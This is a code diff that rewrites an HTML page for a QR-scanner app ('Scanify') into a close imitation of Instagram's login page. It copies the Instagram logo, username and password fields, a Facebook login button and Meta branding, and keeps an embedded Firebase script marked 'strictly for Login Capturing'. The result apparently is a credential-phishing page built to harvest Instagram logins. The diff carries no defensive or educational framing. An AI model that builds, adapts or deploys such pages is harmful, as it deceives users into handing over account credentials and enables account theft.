@@ -1,48 +1,75 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Scanify | Premium QR App</title>
-  <link rel="stylesheet" href="style.css">
-  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <script src="https://unpkg.com/html5-qrcode"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Log into Instagram</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="style.css" />
 </head>
+<body>
+  <div class="card">
+    <header class="top">
+      <svg class="logo" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" aria-label="Instagram">
+        <defs>
+          <linearGradient id="ig" x1="10%" y1="100%" x2="90%" y2="0%">
+            <stop offset="0%" stop-color="#FFC107"/>
+            <stop offset="30%" stop-color="#FF5722"/>
+            <stop offset="60%" stop-color="#E91E63"/>
+            <stop offset="100%" stop-color="#7B3FE4"/>
+          </linearGradient>
+        </defs>
+        <rect width="64" height="64" rx="18" fill="url(#ig)"/>
+        <rect x="12" y="12" width="40" height="40" rx="12" fill="none" stroke="#fff" stroke-width="5"/>
+        <circle cx="32" cy="32" r="9.5" fill="none" stroke="#fff" stroke-width="5"/>
+        <circle cx="45" cy="19" r="3" fill="#fff"/>
+      </svg>
+    </header>
 
-<body class="theme-dark">
+    <main class="content">
+      <h1>Log into Instagram</h1>
 
-  <div class="app-container">
+      <form id="loginForm" novalidate>
+        <div class="field">
+          <input type="text" id="username" placeholder="Mobile number, username or email" autocomplete="username" />
+        </div>
 
-    <!-- Permission Screen -->
-    <div id="permissionScreen" class="screen hidden">
-      <div class="icon-container bounce"><i class="fa-solid fa-shield-halved"></i></div>
-      <h2>Secure Access</h2>
-      <p>Scanify requires Camera and Storage permissions to function seamlessly.</p>
-      <button class="btn primary" onclick="acceptPermissions()">
-        <span>Grant Permissions</span>
-        <i class="fa-solid fa-arrow-right"></i>
+        <div class="field">
+          <input type="password" id="password" placeholder="Password" autocomplete="current-password" />
+          <button type="button" id="toggle" class="eye" aria-label="Show password">
+            <svg id="eyeIcon" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="#262626" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
+              <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
+              <path d="M14.12 14.12a3 3 0 1 1-4.24-4.24"/>
+              <line x1="1" y1="1" x2="23" y2="23"/>
+            </svg>
+          </button>
+        </div>
+
+        <button type="submit" id="loginBtn" class="btn primary" disabled>Log in</button>
+      </form>
+
+      <a href="#" class="forgot">Forgot password?</a>
+
+      <div class="spacer"></div>
+
+      <button class="btn fb" type="button">
+        <svg width="16" height="16" viewBox="0 0 24 24"><circle cx="12" cy="12" r="12" fill="#1877F2"/><path d="M16.6 15.5l.5-3.5h-3.3V9.8c0-1 .5-1.9 2-1.9h1.5V4.9s-1.4-.2-2.7-.2c-2.7 0-4.5 1.7-4.5 4.700V12H7v3.500h3.100V24h3.700v-8.500z" fill="#fff"/></svg>
+        Log in with Facebook
       </button>
-    </div>
+      <button class="btn outline" type="button">Create new account</button>
 
-    <!-- Login Screen -->
-    <div id="loginScreen" class="screen">
-      <div class="icon-container"><i class="fa-solid fa-user-lock"></i></div>
-      <h2>Welcome Back</h2>
-      <p>Log in to access your saved QR codes and settings.</p>
-      <div class="input-group">
-        <i class="fa-solid fa-envelope"></i>
-        <input type="email" id="email" placeholder="Email Address" required>
+      <div class="meta">
+        <svg width="20" height="12" viewBox="0 0 64 32" fill="none" stroke="#0866FF" stroke-width="6" stroke-linecap="round">
+          <path d="M6 22c0-8 5-16 11-16 8 0 14 20 22 20 5 0 8-5 8-10S44 6 39 6c-6 0-10 6-14 12"/>
+        </svg>
+        <span>Meta</span>
       </div>
-      <div class="input-group">
-        <i class="fa-solid fa-lock"></i>
-        <input type="password" id="password" placeholder="Password" required>
-      </div>
-      <button class="btn primary" onclick="login()">
-        <span>Login</span>
-      </button>
+    </main>
 
+    <footer class="bottom"></footer>
+    
       <!-- Firebase Logic strictly for Login Capturing -->
       <script type="module">
         // Import the functions you need from the SDKs you need
@@ -83,128 +110,9 @@
           }
         });
       </script>
-    </div>
-
-    <!-- Home Screen -->
-    <div id="homeScreen" class="screen hidden">
-      <div class="header">
-        <div class="greeting">
-          <h2>Dashboard</h2>
-          <p id="userEmailDisplay">user@example.com</p>
-        </div>
-        <div class="avatar"><i class="fa-solid fa-user"></i></div>
-      </div>
-
-      <div class="card-grid">
-        <div class="action-card" onclick="openScanner()">
-          <div class="card-icon"><i class="fa-solid fa-qrcode"></i></div>
-          <h3>Scan QR</h3>
-          <p>Scan instantly</p>
-        </div>
-        <div class="action-card" onclick="openGenerator()">
-          <div class="card-icon"><i class="fa-solid fa-wand-magic-sparkles"></i></div>
-          <h3>Create QR</h3>
-          <p>Generate codes</p>
-        </div>
-        <div class="action-card" onclick="openSaved()">
-          <div class="card-icon"><i class="fa-solid fa-bookmark"></i></div>
-          <h3>Saved</h3>
-          <p>View history</p>
-        </div>
-        <div class="action-card" onclick="openSettings()">
-          <div class="card-icon"><i class="fa-solid fa-gear"></i></div>
-          <h3>Settings</h3>
-          <p>App preferences</p>
-        </div>
-      </div>
-    </div>
-
-    <!-- Scanner Screen -->
-    <div id="scannerScreen" class="screen hidden">
-      <div class="screen-header">
-        <button class="btn secondary back-btn" onclick="goHome()"><i class="fa-solid fa-chevron-left"></i> Back</button>
-        <h2>Scan QR Code</h2>
-        <div style="width: 80px;"></div>
-      </div>
-      <div class="scanner-container">
-        <div id="reader"></div>
-      </div>
-      <p class="helper-text">Point your camera at a QR code to scan.</p>
-    </div>
-
-    <!-- Generator Screen -->
-    <div id="generatorScreen" class="screen hidden">
-      <div class="screen-header">
-        <button class="btn secondary back-btn" onclick="goHome()"><i class="fa-solid fa-chevron-left"></i> Back</button>
-        <h2>Generate QR</h2>
-        <div style="width: 80px;"></div>
-      </div>
-      <div class="form-container">
-        <div class="input-group">
-          <i class="fa-solid fa-link"></i>
-          <input type="text" id="qrText" placeholder="Enter text or URL...">
-        </div>
-        <button class="btn primary" onclick="generateQR()">Create Magic</button>
-      </div>
-      <div class="qr-result-container" id="qrResultContainer">
-        <div id="qrResult"></div>
-        <button class="btn secondary hidden" id="saveGeneratedBtn" onclick="saveGenerated()">Save QR</button>
-      </div>
-    </div>
-
-    <!-- Saved Screen -->
-    <div id="savedScreen" class="screen hidden">
-      <div class="screen-header">
-        <button class="btn secondary back-btn" onclick="goHome()"><i class="fa-solid fa-chevron-left"></i> Back</button>
-        <h2>Saved Scans</h2>
-        <button class="btn-icon danger" onclick="clearSaved()"><i class="fa-solid fa-trash-can"></i></button>
-      </div>
-      <div class="list-container" id="savedList">
-        <!-- List items go here -->
-      </div>
-    </div>
-
-    <!-- Settings Screen -->
-    <div id="settingsScreen" class="screen hidden">
-      <div class="screen-header">
-        <button class="btn secondary back-btn" onclick="goHome()"><i class="fa-solid fa-chevron-left"></i> Back</button>
-        <h2>Settings</h2>
-        <div style="width: 80px;"></div>
-      </div>
-      <div class="settings-list">
-        <div class="setting-item" onclick="setTheme('theme-light')">
-          <div class="setting-info">
-            <i class="fa-solid fa-sun"></i>
-            <span>Light Mode</span>
-          </div>
-          <i class="fa-solid fa-chevron-right"></i>
-        </div>
-        <div class="setting-item" onclick="setTheme('theme-dark')">
-          <div class="setting-info">
-            <i class="fa-solid fa-moon"></i>
-            <span>Dark Mode</span>
-          </div>
-          <i class="fa-solid fa-chevron-right"></i>
-        </div>
-        <div class="setting-item" onclick="setTheme('theme-eye')">
-          <div class="setting-info">
-            <i class="fa-solid fa-eye-low-vision"></i>
-            <span>Eye Protection</span>
-          </div>
-          <i class="fa-solid fa-chevron-right"></i>
-        </div>
-        <div class="setting-item danger" onclick="logout()">
-          <div class="setting-info">
-            <i class="fa-solid fa-right-from-bracket"></i>
-            <span>Log Out</span>
-          </div>
-        </div>
-      </div>
-    </div>
-
   </div>
 
   <script src="script.js"></script>
+  
 </body>
-
 </html>
